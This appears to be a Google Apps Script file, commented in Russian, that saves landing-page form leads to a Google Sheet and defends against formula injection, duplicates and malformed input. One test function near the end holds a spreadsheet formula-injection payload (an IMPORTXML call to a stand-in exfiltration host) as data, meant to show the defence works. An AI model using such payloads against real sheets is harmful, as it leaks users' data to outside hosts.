/**
 * Сбор заявок с лендинга (index.html) в Google Таблицу.
 *
 * Разворачивается как веб-приложение Apps Script:
 *   Развернуть → Новое развертывание → тип «Веб-приложение»
 *   Выполнять от имени: «Я» | Доступ: «Все» (Anyone)
 * Полученный URL вида  …/exec  вставляется в index.html как SHEETS_URL.
 *
 * Как работает защита:
 *  - POST-only: doGet наружу не отдаёт ничего (таблицу нельзя прочитать извне).
 *  - Формула-инъекция: строка пишется через setNumberFormat('@') + setValues —
 *    значения вида «=1+1», «+7 …» ложатся ТЕКСТОМ и не исполняются.
 *  - Дубли: одинаковая пара имя+телефон в последних 25 строках не пишется
 *    повторно, на клиент уходит {ok:true, dup:true}.
 *  - Всё, что не похоже на ожидаемый формат, чистится/обрезается до записи.
 */

/* ================= НАСТРОЙКИ ================= */
const SHEET_NAME = 'Заявки';
const VERSION = 'final-write-all';

/* ================= ПРИЁМ ЗАЯВКИ (только POST от формы) ================= */
function doPost(e) {
  const lock = LockService.getScriptLock();
  lock.waitLock(10000);
  try {
    if (!e || !e.postData || !e.postData.contents) {
      // Так бывает только при ручном запуске doPost из редактора — это нормально.
      return txtOut({ok:false, error:'Нет данных'});
    }
    let d;
    try { d = JSON.parse(e.postData.contents); }
    catch (_) { return txtOut({ok:false, error:'Некорректный JSON'}); }

    const name    = cleanStr(d.name, 60) || '(без имени)';
    const phone   = cleanPhone(d.phone);            // ГЛАВНОЕ ПОЛЕ: чистим всегда
    const type    = cleanStr(d.contactType, 20) || 'Не указан';
    let  contact  = cleanStr(d.contact, 120);
    const program = cleanStr(d.program, 120);
    const consent = d.consent === 'да' ? 'да' : '';

    // Контакт: нормализуем по каналу; что не совпало с шаблоном — пишем как есть.
    if (type === 'Перезвонить' || type === 'WhatsApp' || !contact) {
      contact = phone ? fmtPhone(phone) : contact;  // контакт = телефон (приоритет)
    } else {
      const norm = normalizeContactSrv(type, contact);
      if (norm) contact = norm;
      else Logger.log(VERSION + ': контакт вне шаблона («' + contact + '») — записан как есть');
    }

    // Дубли по телефону+имени среди последних 25 заявок — не пишем.
    if (phone && isDuplicate(name, phone)) {
      Logger.log(VERSION + ': дубль — запись пропущена');
      return txtOut({ok:true, dup:true});
    }

    const sh = getSheet();
    const row = sh.getLastRow() + 1;
    // Формат '@' на всю строку: "+7..." и "=..." сохраняются КАК ТЕКСТ —
    // формулы не исполняются, #ERROR! невозможен.
    sh.getRange(row, 1, 1, 7).setNumberFormat('@').setValues([[
      cleanStr(d.ts, 40) || new Date().toLocaleString('ru-RU'),
      name,
      phone ? fmtPhone(phone) : '',   // 11 цифр → «+7 (…) …-…-…», иначе цифры как есть
      type, contact, program, consent
    ]]);
    Logger.log(VERSION + ': записана строка ' + row);
    return txtOut({ok:true, v:VERSION});
  } catch (err) {
    Logger.log(VERSION + ' ОШИБКА: ' + err);
    return txtOut({ok:false, error:String(err)});
  } finally {
    lock.releaseLock();
  }
}

/* ================= СЕРВИСНОЕ ================= */
function txtOut(obj) {
  return ContentService.createTextOutput(JSON.stringify(obj))
    .setMimeType(ContentService.MimeType.JSON);
}
function doGet() {
  // Наружу таблицу не отдаём: GET всегда ошибка.
  return txtOut({ok:false, error:'Используйте POST из формы'});
}

function cleanStr(v, max) {
  if (typeof v !== 'string') return '';
  return v
    .replace(/[\u0000-\u001F\u007F]/g, ' ') // control-символы и переводы строк → пробел
    .replace(/\s+/g, ' ')
    .trim()
    .slice(0, max);
}
function cleanPhone(v) {
  if (typeof v !== 'string') return '';
  let dg = v.replace(/\D/g, '');
  if (dg.length === 11 && dg.charAt(0) === '8') dg = '7' + dg.slice(1);
  return dg;
}
function fmtPhone(dg) {
  if (dg.length !== 11) return dg; // не 11 цифр — как есть
  return '+7 (' + dg.slice(1,4) + ') ' + dg.slice(4,7) + '-' + dg.slice(7,9) + '-' + dg.slice(9,11);
}
function normalizeContactSrv(type, raw) {
  let s = String(raw || '').replace(/\s+/g, '');
  if (s.indexOf('/') !== -1) s = s.slice(s.lastIndexOf('/') + 1); // t.me/ivan, vk.com/durov
  s = s.replace(/^@+/, '').replace(/[?#].*$/, '');
  if (type === 'Telegram')  { s = s.replace(/[^A-Za-z0-9_]/g, '');   return (s.length >= 5 && s.length <= 32) ? '@' + s : ''; }
  if (type === 'MAX')       { s = s.replace(/[^A-Za-z0-9_.-]/g, ''); return (s.length >= 3 && s.length <= 32) ? '@' + s : ''; }
  if (type === 'ВКонтакте') { s = s.replace(/[^A-Za-z0-9_-]/g, '');  return (s.length >= 3 && s.length <= 64) ? s : ''; }
  if (type === 'E-mail')    { s = String(raw || '').toLowerCase().replace(/\s+/g, '');
                              return /^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/.test(s) ? s : ''; }
  return '';
}
function isDuplicate(name, phone) {
  const sh = getSheet();
  const last = sh.getLastRow();
  if (last < 2) return false;
  const start = Math.max(2, last - 24);
  const rows = sh.getRange(start, 2, last - start + 1, 2).getDisplayValues(); // B имя, C телефон
  return rows.some(r =>
    (r[1] || '').replace(/\D/g, '') === phone &&
    (r[0] || '').trim().toLowerCase() === name.toLowerCase()
  );
}
function getSheet() {
  const ss = SpreadsheetApp.getActiveSpreadsheet();
  let sh = ss.getSheetByName(SHEET_NAME);
  if (!sh) sh = ss.insertSheet(SHEET_NAME);
  if (sh.getLastRow() === 0) {
    sh.appendRow(['Дата','Имя','Телефон','Способ связи','Контакт','Программа','Согласие']);
    sh.getRange('A1:G1').setFontWeight('bold');
    sh.setFrozenRows(1);
  }
  return sh;
}

/* ================= РУЧНЫЕ ТЕСТЫ (запускать только их, не doPost) ================= */
function testDoPost() {
  doPost({ postData: { contents: JSON.stringify({
    ts: new Date().toLocaleString('ru-RU'), name: 'Тест Тестов', phone: '+7 (999) 123-45-67',
    contactType: 'Telegram', contact: 'testuser', program: 'Экспресс-разбор (тест)', consent: 'да'
  })}});
}
/* Демонстрация защиты: имя-«формула» должно лечь ТЕКСТОМ, не исполниться */
function testInjection() {
  doPost({ postData: { contents: JSON.stringify({
    ts: new Date().toLocaleString('ru-RU'),
    name: '=IMPORTXML("http://evil.example/leak?"&A1)',
    phone: '89991234567',
    contactType: 'Telegram', contact: '=1+1',
    program: '', consent: 'да'
  })}});
}